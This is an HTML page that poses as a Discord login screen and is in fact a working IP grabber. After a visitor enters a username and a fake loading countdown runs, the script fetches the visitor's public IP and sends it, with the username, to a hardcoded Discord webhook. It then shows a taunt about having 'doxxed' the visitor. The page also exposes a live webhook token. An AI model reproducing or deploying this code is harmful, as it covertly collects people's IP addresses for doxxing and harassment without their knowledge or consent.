<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
            color: #333;
            text-align: center;
        }
        .container {
            max-width: 600px;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        #countdown {
            font-size: 2em;
            color: #e63946;
        }
        #loading-message {
            font-size: 1.2em;
            margin-top: 20px;
            color: #2a9d8f;
        }
    </style>
</head>
<body>
    <div class="container" id="login-page">
        <h1>Login to Continue</h1>
        <form id="login-form">
            <label for="username">Enter your Discord username:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            <button type="submit">Submit</button>
        </form>
    </div>

    <div class="container" id="countdown-page" style="display: none;">
        <h1>Website is loading...</h1>
        <p>This action will start in <span id="countdown">10</span> seconds.</p>
        <p id="loading-message">Please wait...</p>
    </div>

    <div class="container" id="final-page" style="display: none;">
        <h1>Bro was looking for a dox and got doxxed LMFAOOO!</h1>
    </div>

    <script>
        // Login page handling
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            
            // Hide login page and show countdown page
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('countdown-page').style.display = 'block';

            // Start countdown
            startCountdown(username);
        });

        // Countdown function with IP logging and Discord webhook
        function startCountdown(username) {
            let countdown = 1;
            const countdownElement = document.getElementById('countdown');

            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;

                if (countdown === 0) {
                    clearInterval(countdownInterval);
                    fetchUserIP(username);
                }
            }, 1000);
        }

        // Function to fetch IP address and send it to Discord webhook without displaying it
        function fetchUserIP(username) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    
                    // Send the IP and username to a Discord webhook
                    sendToDiscord(username, userIP);

                    // Redirect to final page after a delay
                    setTimeout(() => {
                        document.getElementById('countdown-page').style.display = 'none';
                        document.getElementById('final-page').style.display = 'block';
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });
        }

        // Function to send IP address and username to Discord webhook
        function sendToDiscord(username, ip) {
            const webhookUrl = "https://discord.com/api/webhooks/1305170371296890911/Q6lMJsKCwrQ1ftD79-8FP_Leh0X8xKSDVKG3ZI_mW963gR72q-M9NtezPbRAD3L2sS26"; // Replace with your webhook URL
            const message = {
                content: `User ${username} with IP Address: ${ip} has initiated the countdown.`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP and username sent to Discord successfully.');
                } else {
                    console.error('Failed to send to Discord:', response.statusText);
                }
            })
            .catch(error => console.error('Error sending to Discord:', error));
        }
    </script>
</body>
</html>
